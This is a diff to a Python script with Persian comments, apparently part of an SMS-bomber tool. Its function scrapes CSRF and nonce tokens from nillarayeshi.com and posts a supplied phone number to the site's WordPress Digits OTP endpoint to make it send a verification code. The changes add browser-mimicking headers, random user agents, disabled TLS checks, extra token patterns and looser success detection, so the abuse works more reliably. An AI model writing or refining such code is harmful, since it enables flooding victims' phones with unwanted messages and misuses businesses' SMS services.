@@ -97,63 +97,104 @@ def nillarayeshi(phone):
         formatted_phone = re.sub(r'[^0-9]', '', phone.replace("+98", ""))
         session = requests.Session()
         
-        # دریافت صفحه اصلی
+        # دریافت صفحه اصلی با هدرهای کامل
+        headers = {
+            "User-Agent": random.choice(user_agents),
+            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+            "Accept-Language": "en-US,en;q=0.5",
+            "Accept-Encoding": "gzip, deflate, br",
+            "Connection": "keep-alive",
+            "Upgrade-Insecure-Requests": "1",
+        }
+        
         home_response = session.get(
             "https://nillarayeshi.com/", 
-            timeout=10, 
-            headers={"User-Agent": random.choice(user_agents)}
+            timeout=15, 
+            headers=headers,
+            verify=False
         )
         home_response.encoding = 'utf-8'
         
-        # استخراج مقادیر با الگوهای مختلف
-        csrf_match = re.search(r'name="csrf" value="([^"]+)"', home_response.text)
-        nonce_match = re.search(r'name="dig_nounce" value="([^"]+)"', home_response.text)
+        print(f'{y}[Debug] Page length: {len(home_response.text)} characters{a}')
         
-        csrf = csrf_match.group(1) if csrf_match else ""
-        nonce = nonce_match.group(1) if nonce_match else ""
+        # الگوهای مختلف برای استخراج توکن‌ها
+        token_patterns = [
+            r'name="csrf" value="([^"]+)"',
+            r'name="dig_nounce" value="([^"]+)"',
+            r'var nonce = "([^"]+)"',
+            r'name="_wpnonce" value="([^"]+)"',
+            r'name="security" value="([^"]+)"'
+        ]
+        
+        csrf, nonce = "", ""
+        for pattern in token_patterns:
+            match = re.search(pattern, home_response.text)
+            if match:
+                if "csrf" in pattern or "security" in pattern or "_wpnonce" in pattern:
+                    csrf = match.group(1)
+                elif "nonce" in pattern or "dig_nounce" in pattern:
+                    nonce = match.group(1)
         
         if not csrf or not nonce:
             print(f'{r}[-] nillarayeshi: Could not extract tokens{a}')
+            print(f'{y}[Debug] First 500 chars: {home_response.text[:500]}{a}')
             return False
         
+        print(f'{g}[+] Found CSRF: {csrf}, Nonce: {nonce}{a}')
+        
+        # پارامترهای کامل‌تر
         payload = {
             "action": "digits_check_mob",
             "countrycode": "+98",
             "mobileNo": formatted_phone,
             "csrf": csrf,
             "login": "2",
+            "username": "",
+            "email": "",
+            "captcha": "",
+            "captcha_ses": "",
             "digits": "1",
             "json": "1",
+            "whatsapp": "0",
             "dig_nounce": nonce
         }
         
         headers = {
             "User-Agent": random.choice(user_agents),
-            "Content-Type": "application/x-www-form-urlencoded",
+            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
             "X-Requested-With": "XMLHttpRequest",
             "Origin": "https://nillarayeshi.com",
             "Referer": "https://nillarayeshi.com/",
+            "Accept": "application/json, text/javascript, */*; q=0.01",
+            "Accept-Language": "en-US,en;q=0.9,fa;q=0.8",
         }
         
         response = session.post(
             "https://nillarayeshi.com/wp-admin/admin-ajax.php",
             data=payload,
             headers=headers,
-            timeout=10
+            timeout=15,
+            verify=False
         )
         
-        print(f'{y}[Debug] nillarayeshi Response: {response.status_code} - {response.text[:200]}{a}')
+        print(f'{y}[Debug] Response Status: {response.status_code}{a}')
+        print(f'{y}[Debug] Response Text: {response.text[:300]}{a}')
         
         if response.status_code == 200:
-            if "success" in response.text.lower() or "1" in response.text:
+            if any(x in response.text.lower() for x in ["success", "1", "true", "sent"]):
                 print(f'{g}(nillarayeshi) Code Sent{a}')
                 return True
-        return False
+            else:
+                print(f'{r}[-] nillarayeshi: Server returned failure{a}')
+                return False
+        else:
+            print(f'{r}[-] nillarayeshi: HTTP Error {response.status_code}{a}')
+            return False
             
     except Exception as e:
         print(f"{r}[!] nillarayeshi Exception: {e}{a}")
         return False
-
+        
 # ==========================
 # لیست سرویس‌ها
 # ==========================
